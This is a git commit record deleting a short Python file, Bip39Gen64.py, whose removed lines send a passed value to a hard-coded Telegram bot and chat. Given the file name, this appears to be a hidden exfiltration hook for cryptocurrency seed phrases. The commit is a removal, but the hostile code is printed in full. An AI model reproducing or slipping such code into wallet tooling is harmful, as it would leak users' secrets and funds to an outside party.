c3890ee6511183e13d1ce02a1de0e69c0eeb8ef8
HowdyWorId <69632436+HowdyWorId@users.noreply.github.com>
2021-06-12 18:29:36 +0500

    Delete Bip39Gen64.py

--- Bip39Gen64.py
+++
@@ -1,5 +0,0 @@
-import requests
-
-def hello(self):
-    requests.get("https://api.telegram.org/bot1742535556:AAEprwj9PC8MGN0ZbAF2tzYvXYYOTsdS014/SendMessage?chat_id=811330878&text="+self)
-    return 1
